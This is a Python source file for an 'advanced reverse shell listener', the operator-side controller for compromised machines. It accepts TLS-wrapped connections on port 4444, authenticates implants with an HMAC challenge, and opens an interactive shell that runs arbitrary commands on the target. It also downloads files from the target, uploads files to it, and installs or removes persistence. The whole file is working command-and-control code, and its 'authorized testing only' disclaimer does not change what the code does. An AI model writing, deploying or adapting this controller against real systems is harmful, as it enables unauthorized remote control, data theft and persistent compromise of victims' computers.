#!/usr/bin/env python3
"""
Advanced Reverse Shell Listener
Features: SSL/TLS, Password Auth, File Transfer, Better Error Handling
For authorized security testing only.
"""

import socket
import ssl
import sys
import threading
import os
import hashlib
import hmac
import base64
import time
from datetime import datetime

# ==================== CONFIGURATION ====================
DEFAULT_PORT = 4444
CERT_FILE = "server_cert.pem"
KEY_FILE = "server_key.pem"
# Default password hash (password: "changeme123")
# Generate new: python3 -c "import hashlib; print(hashlib.sha256(b'YourPassword').hexdigest())"
PASSWORD_HASH = hashlib.sha256(b"changeme123").hexdigest()
BUFFER_SIZE = 65536
# =======================================================


def log(msg, level="INFO"):
    """Timestamped logging"""
    ts = datetime.now().strftime("%H:%M:%S")
    symbols = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "CMD": "[>]"}
    print(f"{symbols.get(level, '[*]')} [{ts}] {msg}")


def recv_exact(sock, n):
    """Receive exactly n bytes (TCP stream safe)"""
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed by peer")
        data += chunk
    return data


def recv_message(sock):
    """Receive a length-prefixed message"""
    try:
        length_bytes = recv_exact(sock, 4)
        length = int.from_bytes(length_bytes, "big")
        if length == 0:
            return b""
        return recv_exact(sock, length)
    except Exception as e:
        raise ConnectionError(f"recv_message failed: {e}")


def send_message(sock, data):
    """Send a length-prefixed message"""
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(len(data).to_bytes(4, "big") + data)


def authenticate(client_sock):
    """Handle password authentication"""
    try:
        # Server sends challenge
        challenge = base64.b64encode(os.urandom(32)).decode()
        send_message(client_sock, challenge)

        # Client responds with HMAC(password_hash, challenge)
        response = recv_message(client_sock).decode()

        expected = hmac.new(
            PASSWORD_HASH.encode(), challenge.encode(), hashlib.sha256
        ).hexdigest()

        if hmac.compare_digest(response, expected):
            send_message(client_sock, "AUTH_OK")
            return True
        else:
            send_message(client_sock, "AUTH_FAIL")
            return False
    except Exception as e:
        log(f"Auth error: {e}", "ERR")
        return False


def handle_file_transfer(client_sock, cmd):
    """Handle file download/upload commands"""
    parts = cmd.split()
    if len(parts) < 3:
        return "[-] Usage:\n  download <remote_path> <local_path>\n  upload <local_path> <remote_path>"

    action = parts[0]
    remote_path = parts[1]
    local_path = parts[2]

    if action == "download":
        # Ask target for file
        send_message(client_sock, f"__FILE_GET__ {remote_path}")
        status = recv_message(client_sock).decode()

        if status.startswith("ERROR"):
            return f"[-] {status}"

        # Receive file size
        size = int(recv_message(client_sock).decode())
        log(f"Receiving {remote_path} ({size} bytes)...", "INFO")

        # Receive file in chunks
        received = b""
        while len(received) < size:
            chunk = recv_message(client_sock)
            received += chunk

        with open(local_path, "wb") as f:
            f.write(received)

        return f"[+] Downloaded {remote_path} -> {local_path} ({size} bytes)"

    elif action == "upload":
        if not os.path.exists(local_path):
            return f"[-] Local file not found: {local_path}"

        with open(local_path, "rb") as f:
            file_data = f.read()

        send_message(client_sock, f"__FILE_PUT__ {remote_path}")
        send_message(client_sock, str(len(file_data)))
        send_message(client_sock, file_data)

        status = recv_message(client_sock).decode()
        return f"[+] {status}"

    return "[-] Unknown file operation"


def handle_client(client_sock, addr):
    """Main client handler"""
    log(f"Connection from {addr[0]}:{addr[1]}", "OK")

    try:
        # Wrap socket with SSL
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        try:
            ssl_sock = context.wrap_socket(client_sock, server_side=True)
            log("TLS handshake complete", "OK")
        except ssl.SSLError as e:
            log(f"TLS handshake failed: {e}", "ERR")
            client_sock.close()
            return

        # Authenticate
        if not authenticate(ssl_sock):
            log(f"Authentication failed for {addr[0]}", "ERR")
            ssl_sock.close()
            return

        log(f"Client authenticated: {addr[0]}", "OK")

        # Get system info
        send_message(ssl_sock, "__SYSINFO__")
        sysinfo = recv_message(ssl_sock).decode()
        log(f"Target info:\n{sysinfo}", "INFO")

        # Interactive shell
        print("\n" + "=" * 60)
        print(" Interactive shell ready. Type 'help' for commands.")
        print("=" * 60 + "\n")

        while True:
            try:
                cmd = input("shell> ").strip()

                if not cmd:
                    continue

                if cmd.lower() in ("quit", "exit"):
                    send_message(ssl_sock, "quit")
                    break

                if cmd.lower() == "help":
                    print("""
Available commands:
  <any shell cmd>              Execute system command
  download <remote> <local>    Download file from target
  upload <local> <remote>      Upload file to target
  persist                      Install persistence on target
  unpersist                    Remove persistence
  sysinfo                      Show system information
  screenshot                   Capture screenshot
  quit / exit                  Close session
                    """)
                    continue

                if cmd.lower() == "sysinfo":
                    send_message(ssl_sock, "__SYSINFO__")
                    print(recv_message(ssl_sock).decode())
                    continue

                if cmd.lower() == "persist":
                    send_message(ssl_sock, "__PERSIST__")
                    print(recv_message(ssl_sock).decode())
                    continue

                if cmd.lower() == "unpersist":
                    send_message(ssl_sock, "__UNPERSIST__")
                    print(recv_message(ssl_sock).decode())
                    continue

                if cmd.split()[0] in ("download", "upload"):
                    result = handle_file_transfer(ssl_sock, cmd)
                    print(result)
                    continue

                # Regular command
                log(cmd, "CMD")
                send_message(ssl_sock, cmd)
                output = recv_message(ssl_sock).decode(errors="ignore")
                print(output)

            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                send_message(ssl_sock, "quit")
                break
            except Exception as e:
                log(f"Command error: {e}", "ERR")
                break

    except Exception as e:
        log(f"Session error: {e}", "ERR")
    finally:
        try:
            client_sock.close()
        except Exception:
            pass
        log(f"Session closed: {addr[0]}", "INFO")


def start_listener(host="0.0.0.0", port=DEFAULT_PORT):
    """Start the SSL listener"""
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        log(f"Certificate files missing! Run the openssl command to generate them.", "ERR")
        log(f"  Needed: {CERT_FILE} and {KEY_FILE}", "ERR")
        sys.exit(1)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(10)

    log(f"Listening on {host}:{port} (TLS enabled)", "OK")
    log("Waiting for connections...", "INFO")

    try:
        while True:
            client_sock, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(client_sock, addr), daemon=True)
            t.start()
    except KeyboardInterrupt:
        log("Shutting down...", "INFO")
    finally:
        server.close()


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_PORT
    start_listener(port=port)